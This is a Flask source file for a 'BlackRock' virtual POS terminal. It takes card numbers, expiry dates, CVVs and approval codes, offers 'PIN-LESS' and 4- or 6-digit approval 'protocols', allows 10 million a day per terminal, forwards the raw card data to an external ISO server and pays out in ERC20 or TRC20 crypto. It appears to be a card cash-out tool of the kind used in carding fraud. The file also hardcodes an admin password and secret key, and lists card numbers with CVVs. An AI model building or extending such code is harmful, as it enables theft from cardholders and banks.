# app.py
from flask import Flask, render_template, request, redirect, session, url_for, flash, jsonify, g
import random, logging, qrcode, io, os, json, hashlib, re
from datetime import datetime, date, timedelta
from functools import wraps
import requests # <--- THIS LINE IS CRUCIAL AND MUST BE PRESENT

# --- Firebase and Firestore Imports ---
import firebase_admin
from firebase_admin import credentials, firestore, auth

app = Flask(__name__)
app.secret_key = os.environ.get('FLASK_SECRET_KEY', 'blackrock_secret_key_8583_DEFAULT_DO_NOT_USE_IN_PROD')
logging.basicConfig(level=logging.INFO)

# Configuration
USERNAME = "blackrockadmin"
PASSWORD_FILE = "password.json"

# --- Firebase Initialization (for Canvas environment) ---
firebase_config = json.loads(os.environ.get('__firebase_config', '{}'))
initial_auth_token = os.environ.get('__initial_auth_token')
app_id = os.environ.get('__app_id', 'default-app-id')

db = None
current_user_id = None

if firebase_config:
    try:
        cred = credentials.Certificate(firebase_config)
        firebase_admin.initialize_app(cred)
        db = firestore.client()
        print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] app.py: Firebase initialized successfully.")

        if initial_auth_token:
            try:
                user = auth.verify_id_token(initial_auth_token)
                current_user_id = user['uid']
                print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] app.py: Signed in with custom token. User ID: {current_user_id}")
            except Exception as e:
                print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] app.py: Error verifying custom auth token: {e}")
                current_user_id = "anonymous_" + os.urandom(16).hex()
                print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] app.py: Signed in anonymously. User ID: {current_user_id}")
        else:
            current_user_id = "anonymous_" + os.urandom(16).hex()
            print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] app.py: No initial auth token. Signed in anonymously. User ID: {current_user_id}")

    except Exception as e:
        print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] app.py: Error initializing Firebase: {e}")
        db = None
else:
    print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] app.py: Firebase config not found. Firestore will not be available.")

# --- Ensure password file exists and is initialized with the correct hash ---
if not os.path.exists(PASSWORD_FILE):
    with open(PASSWORD_FILE, "w") as f:
        hashed = hashlib.sha256("Br_3339".encode()).hexdigest()
        json.dump({"password": hashed}, f)
    print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] app.py: Initialized password.json with default password.")
else:
    try:
        with open(PASSWORD_FILE, "r") as f:
            stored_data = json.load(f)
            if "password" not in stored_data:
                raise ValueError("Password key missing in password.json")
    except (FileNotFoundError, json.JSONDecodeError, ValueError) as e:
        print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] app.py: Error reading password.json ({e}). Re-initializing.")
        with open(PASSWORD_FILE, "w") as f:
            hashed = hashlib.sha256("Br_3339".encode()).hexdigest()
            json.dump({"password": hashed}, f)


def check_password(raw):
    with open(PASSWORD_FILE) as f:
        stored = json.load(f)['password']
    return hashlib.sha256(raw.encode()).hexdigest() == stored

def set_password(newpass):
    with open(PASSWORD_FILE, "w") as f:
        hashed = hashlib.sha256(newpass.encode()).hexdigest()
        json.dump({"password": hashed}, f)
    print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] app.py: Password changed successfully.")

def login_required(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        if not session.get("logged_in"):
            flash("You must be logged in to access this page.", "error")
            return redirect(url_for("login"))
        return f(*args, **kwargs)
    return decorated

@app.before_request
def set_global_user_id():
    g.user_id = current_user_id if current_user_id else "anonymous"


# Dummy card database (kept as is from your sample)
DUMMY_CARDS = {
    "4114755393849011": {"expiry": "0926", "cvv": "363", "auth": "1942", "type": "POS-101.1"},
    "4000123412341234": {"expiry": "1126", "cvv": "123", "auth": "4021", "type": "POS-101.1"},
    "4117459374038454": {"expiry": "1026", "cvv": "258", "auth": "384726", "type": "POS-101.4"},
    "4123456789012345": {"expiry": "0826", "cvv": "852", "auth": "495128", "type": "POS-101.4"},
    "5454957994741066": {"expiry": "1126", "cvv": "746", "auth": "627192", "type": "POS-101.6"},
    "6011000990131077": {"expiry": "0825", "cvv": "330", "auth": "8765", "type": "POS-101.7"},
    "3782822463101088": {"expiry": "1226", "cvv": "1059", "auth": "0000", "type": "POS-101.8"},
    "3530760473041099": {"expiry": "0326", "cvv": "244", "auth": "712398", "type": "POS-201.1"},
    "4114938274651920": {"expiry": "0926", "cvv": "463", "auth": "3127", "type": "POS-101.1"},
    "4001948263728191": {"expiry": "1026", "cvv": "291", "auth": "574802", "type": "POS-101.4"},
    "6011329481720394": {"expiry": "0825", "cvv": "310", "auth": "8891", "type": "POS-101.7"},
    "378282246310106":  {"expiry": "1226", "cvv": "1439", "auth": "0000", "type": "POS-101.8"},
    "3531540982734612": {"expiry": "0326", "cvv": "284", "auth": "914728", "type": "POS-201.1"},
    "5456038291736482": {"expiry": "1126", "cvv": "762", "auth": "695321", "type": "POS-201.3"},
    "4118729301748291": {"expiry": "1026", "cvv": "249", "auth": "417263", "type": "POS-201.5"}
}

PROTOCOLS = {
    "POS Terminal -101.1 (4-digit approval)": 4,
    "POS Terminal -101.4 (6-digit approval)": 6,
    "POS Terminal -101.6 (Pre-authorization)": 6,
    "POS Terminal -101.7 (4-digit approval)": 4,
    "POS Terminal -101.8 (PIN-LESS transaction)": 4,
    "POS Terminal -201.1 (6-digit approval)": 6,
    "POS Terminal -201.3 (6-digit approval)": 6,
    "POS Terminal -201.5 (6-digit approval)": 6
}

FIELD_39_RESPONSES = {
    "00": "Transaction Approved",
    "05": "Do Not Honor",
    "14": "Terminal unable to resolve encrypted session state. Contact card issuer",
    "54": "Expired Card",
    "82": "Invalid CVV",
    "91": "Issuer Inoperative",
    "92": "Invalid Terminal Protocol",
    "99": "General Error / Server Timeout"
}

# --- Configuration for ISOserver.py communication ---
ISO_SERVER_URL = os.environ.get('ISO_SERVER_URL')
if not ISO_SERVER_URL:
    logging.error("ISO_SERVER_URL environment variable is not set. Please configure it for production.")
    ISO_SERVER_URL = 'http://127.0.0.1:5000/process_payment'

# --- Default Payout Wallets (from environment variables) ---
DEFAULT_ERC20_WALLET = os.environ.get('DEFAULT_ERC20_WALLET', '0xDefaultERC20WalletAddressForTesting')
DEFAULT_TRC20_WALLET = os.environ.get('DEFAULT_TRC20_WALLET', 'TDefaultTRC20WalletAddressForTesting')

# --- Daily Transaction Limit per Terminal ---
DAILY_LIMIT_PER_TERMINAL = 10_000_000 # 10 Million USD/EUR equivalent

@app.route('/')
def home():
    return redirect(url_for('login'))

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        user = request.form.get('username')
        passwd = request.form.get('password')
        if user == USERNAME and check_password(passwd):
            session['logged_in'] = True
            session['terminal_id'] = f"TERM-{os.urandom(4).hex()}"
            session['daily_amount_spent'] = 0.0
            session['last_transaction_date'] = date.today().isoformat()
            flash("Logged in successfully!", "success")
            return redirect(url_for('dashboard'))
        flash("Invalid username or password.", "error")
    return render_template('login.html')

@app.route('/logout')
def logout():
    session.clear()
    flash("You have been logged out.", "info")
    return redirect(url_for('login'))

@app.route('/dashboard')
@login_required
def dashboard():
    return render_template('dashboard.html')

@app.route('/change-password', methods=['GET', 'POST'])
@login_required
def change_password():
    if request.method == 'POST':
        current = request.form.get('current')
        new = request.form.get('new')
        confirm_new = request.form.get('confirm_new')

        if not current or not new or not confirm_new:
            flash("All fields are required.", "error")
            return render_template('change_password.html')

        if not check_password(current):
            flash("Current password incorrect.", "error")
            return render_template('change_password.html')

        if new != confirm_new:
            flash("New password and confirmation do not match.", "error")
            return render_template('change_password.html')

        if len(new) < 8:
            flash("New password must be at least 8 characters long.", "error")
            return render_template('change_password.html')

        set_password(new)
        flash("Password changed successfully!", "success")
        return redirect(url_for('login'))
    return render_template('change_password.html')

@app.route('/forgot-password', methods=['GET', 'POST'])
def forgot_password():
    if request.method == 'POST':
        flash("Forgot password functionality is not implemented in this demo. Please contact support.", "info")
        return redirect(url_for('login'))
    return render_template('forgot_password.html')

@app.route('/protocol', methods=['GET', 'POST'])
@login_required
def protocol():
    if request.method == 'POST':
        selected = request.form.get('protocol')
        print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] app.py: Protocol selected from form: '{selected}'")

        if selected not in PROTOCOLS:
            flash(f"Invalid protocol selected: {selected}", "error")
            return redirect(url_for('rejected', code="92", reason=FIELD_39_RESPONSES["92"]))
        
        session['protocol'] = selected
        session['code_length'] = PROTOCOLS[selected]
        print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] app.py: Session 'protocol' set to: '{session['protocol']}'")
        print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] app.py: Session 'code_length' set to: {session['code_length']}")

        return redirect(url_for('amount'))
    return render_template('protocol.html', protocols=PROTOCOLS.keys())

@app.route('/amount', methods=['GET', 'POST'])
@login_required
def amount():
    if request.method == 'POST':
        amount_str = request.form.get('amount')
        currency = request.form.get('currency')

        if not currency or currency not in ['USD', 'EUR']:
            flash("Please select a valid currency.", "error")
            return render_template('amount.html')

        try:
            amount_float = float(amount_str)
            if amount_float <= 0:
                flash("Amount must be a positive number.", "error")
                return render_template('amount.html')

            # --- Daily Limit Check ---
            current_date = date.today()
            last_txn_date_str = session.get('last_transaction_date')

            if last_txn_date_str and date.fromisoformat(last_txn_date_str) < current_date:
                session['daily_amount_spent'] = 0.0
                session['last_transaction_date'] = current_date.isoformat()

            current_spent = session.get('daily_amount_spent', 0.0)
            if (current_spent + amount_float) > DAILY_LIMIT_PER_TERMINAL:
                flash(f"Daily transaction limit of {DAILY_LIMIT_PER_TERMINAL:,.2f} {currency} exceeded for this terminal.", "error")
                return render_template('amount.html')

            session['amount'] = amount_str
            session['currency'] = currency
            session['daily_amount_spent'] = current_spent + amount_float

        except ValueError:
            flash("Invalid amount. Please enter a number.", "error")
            return render_template('amount.html')
        return redirect(url_for('payout'))
    return render_template('amount.html')

@app.route('/payout', methods=['GET', 'POST'])
@login_required
def payout():
    if request.method == 'POST':
        method = request.form['method']
        session['payout_type'] = method

        if method == 'ERC20':
            wallet = DEFAULT_ERC20_WALLET
        elif method == 'TRC20':
            wallet = DEFAULT_TRC20_WALLET
        else:
            flash("Invalid payout method selected.", "error")
            return redirect(url_for('payout'))

        session['wallet'] = wallet

        return redirect(url_for('card'))

    return render_template('payout.html',
                           default_erc20_wallet=DEFAULT_ERC20_WALLET,
                           default_trc20_wallet=DEFAULT_TRC20_WALLET)

@app.route('/card', methods=['GET', 'POST'])
@login_required
def card():
    if request.method == 'POST':
        pan = request.form['pan'].replace(" ", "")
        exp = request.form['expiry'].replace("/", "")
        cvv = request.form['cvv']
        session.update({'pan': pan, 'exp': exp, 'cvv': cvv})

        if pan.startswith("4"):
            session['card_type'] = "VISA"
        elif pan.startswith("5"):
            session['card_type'] = "MASTERCARD"
        elif pan.startswith("3"):
            session['card_type'] = "AMEX"
        elif pan.startswith("6"):
            session['card_type'] = "DISCOVER"
        else:
            session['card_type'] = "UNKNOWN"

        return redirect(url_for('auth'))

    return render_template('card.html')

@app.route('/auth', methods=['GET', 'POST'])
@login_required
def auth():
    expected_length = session.get('code_length', 6)
    print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] app.py: Auth route - Retrieved 'code_length' from session: {expected_length}")

    if request.method == 'POST':
        code = request.form.get('auth')
        print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] app.py: Auth route - Received auth code: '{code}', Length: {len(code)}")

        if len(code) != expected_length:
            flash(f"Authorization code must be {expected_length} digits.", "error")
            return render_template('auth.html', warning=f"Code must be {expected_length} digits.", expected_length=expected_length)

        card_data_for_server = {
            'pan': session.get('pan'),
            'amount': session.get('amount'),
            'expiry': session.get('exp'),
            'cvv': session.get('cvv'),
            'currency': session.get('currency', 'USD'),
            'payout_type': session.get('payout_type'),
            'wallet': session.get('wallet')
        }

        print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] app.py: Sending payment request to ISOserver.py at {ISO_SERVER_URL}...")
        try:
            response = requests.post(ISO_SERVER_URL, json=card_data_for_server, timeout=30)
            response.raise_for_status()
            payment_result = response.json()
            print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] app.py: Received response from ISOserver.py: {payment_result}")

            status = payment_result.get("status")
            message = payment_result.get("message", "Unknown status")
            transaction_id = payment_result.get("transaction_id", f"TXN{random.randint(100000, 999999)}")
            payout_tx_hash = payment_result.get("payout_tx_hash", "")
            field39_resp = payment_result.get("field39", "XX")

            session.update({
                "txn_id": transaction_id,
                "arn": payment_result.get("arn", f"ARN{random.randint(100000000000, 999999999999)}"),
                "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                "field39": field39_resp,
                "payout_tx_hash": payout_tx_hash
            })

            if db and current_user_id:
                try:
                    transactions_ref = db.collection('artifacts').document(app_id).collection('users').document(current_user_id).collection('transactions')
                    transactions_ref.add({
                        'terminal_id': session.get('terminal_id'),
                        'transaction_id': transaction_id,
                        'amount': float(session.get('amount')),
                        'currency': session.get('currency'),
                        'card_pan_last4': session.get('pan')[-4:],
                        'payout_type': session.get('payout_type'),
                        'merchant_wallet': session.get('wallet'),
                        'status': status,
                        'message': message,
                        'payout_tx_hash': payout_tx_hash,
                        'iso_field39': field39_resp,
                        'timestamp': firestore.SERVER_TIMESTAMP
                    })
                    print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] app.py: Transaction logged to Firestore.")
                except Exception as e:
                    print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] app.py: Error logging transaction to Firestore: {e}")
                    flash("Failed to log transaction history.", "warning")
            else:
                print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] app.py: Firestore not initialized or user not authenticated. Skipping transaction logging.")


            if status == "approved":
                flash("Payment Approved and Payout Initiated!", "success")
                return redirect(url_for('success'))
            elif status == "approved_payout_failed" or status == "approved_payout_timeout" or status == "approved_payout_connection_error":
                flash(f"Payment Approved, but Payout Failed: {message}. Manual reconciliation required.", "warning")
                return redirect(url_for('success'))
            else:
                flash(f"Payment Rejected: {message}", "error")
                return redirect(url_for('rejected', code=field39_resp, reason=message))

        except requests.exceptions.Timeout:
            logging.error(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] app.py: Error: Request to ISOserver.py timed out after 30 seconds.")
            flash("Payment request timed out. Please check server status.", "error")
            return redirect(url_for('rejected', code="99", reason="Server Timeout"))
        except requests.exceptions.ConnectionError as e:
            logging.error(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] app.py: Error: Could not connect to ISOserver.py at {ISO_SERVER_URL}: {e}")
            flash(f"Could not connect to payment gateway. Server might be down: {e}", "error")
            return redirect(url_for('rejected', code="99", reason="Gateway Unreachable"))
        except requests.exceptions.RequestException as e:
            logging.error(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] app.py: Error: An error occurred during the request: {e}", exc_info=True)
            flash(f"An error occurred during payment processing: {e}", "error")
            return redirect(url_for('rejected', code="99", reason="Payment Processing Error"))
        except json.JSONDecodeError:
            logging.error(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] app.py: Error: Invalid JSON response from ISOserver.py.", exc_info=True)
            flash("Invalid response from payment gateway.", "error")
            return redirect(url_for('rejected', code="99", reason="Invalid Server Response"))
        except Exception as e:
            logging.critical(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] app.py: Critical Error: Unexpected error in auth route: {e}", exc_info=True)
            flash(f"An unexpected error occurred: {e}", "error")
            return redirect(url_for('rejected', code="99", reason="Unexpected Error"))

    return render_template('auth.html', expected_length=expected_length) # Pass expected_length for GET requests too

@app.route('/success')
@login_required
def success():
    payout_tx_hash = session.get("payout_tx_hash", "N/A")
    return render_template('success.html',
        txn_id=session.get("txn_id"),
        arn=session.get("arn"),
        pan=session.get("pan", "")[-4:],
        amount=session.get("amount"),
        timestamp=session.get("timestamp"),
        payout_tx_hash=payout_tx_hash
    )

@app.route("/receipt")
def receipt():
    raw_protocol = session.get("protocol", "")
    match = re.search(r"-(\d+\.\d+)\s+\((\d+)-digit", raw_protocol)
    if match:
        protocol_version = match.group(1)
        auth_digits = int(match.group(2))
    else:
        protocol_version = "Unknown"
        auth_digits = 4

    raw_amount = session.get("amount", "0")
    if raw_amount and raw_amount.replace('.', '', 1).isdigit():
        amount_fmt = f"{float(raw_amount):,.2f}"
    else:
        amount_fmt = "0.00"

    payout_tx_hash = session.get("payout_tx_hash", "N/A")

    return render_template("receipt.html",
        txn_id=session.get("txn_id"),
        arn=session.get("arn"),
        pan=session.get("pan")[-4:],
        amount=amount_fmt,
        payout=session.get("payout_type"),
        wallet=session.get("wallet"),
        auth_code="*" * auth_digits,
        iso_field_18="5999",
        iso_field_25="00",
        field39=session.get("field39", "XX"),
        card_type=session.get("card_type", "VISA"),
        protocol_version=protocol_version,
        timestamp=session.get("timestamp"),
        payout_tx_hash=payout_tx_hash
    )

@app.route('/rejected')
def rejected():
    return render_template('rejected.html',
        code=request.args.get("code"),
        reason=request.args.get("reason", "Transaction Declined")
    )

@app.route('/offline')
@login_required
def offline():
    return render_template('offline.html')

@app.route('/transactions')
@login_required
def transactions_dashboard():
    if not db or not current_user_id:
        flash("Transaction history is not available. Firestore not initialized or user not authenticated.", "error")
        return render_template('transactions.html', transactions=[])

    try:
        transactions_ref = db.collection('artifacts').document(app_id).collection('users').document(current_user_id).collection('transactions')
        query = transactions_ref.order_by('timestamp', direction=firestore.Query.DESCENDING).limit(100)

        transactions = []
        docs = query.stream()
        for doc in docs:
            txn = doc.to_dict()
            if 'timestamp' in txn and hasattr(txn['timestamp'], 'strftime'):
                txn['timestamp'] = txn['timestamp'].strftime('%Y-%m-%d %H:%M:%S')
            transactions.append(txn)
        return render_template('transactions.html', transactions=transactions)
    except Exception as e:
        logging.error(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] app.py: Error fetching transactions from Firestore: {e}", exc_info=True)
        flash("Failed to load transaction history.", "error")
        return render_template('transactions.html', transactions=[])


if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False)
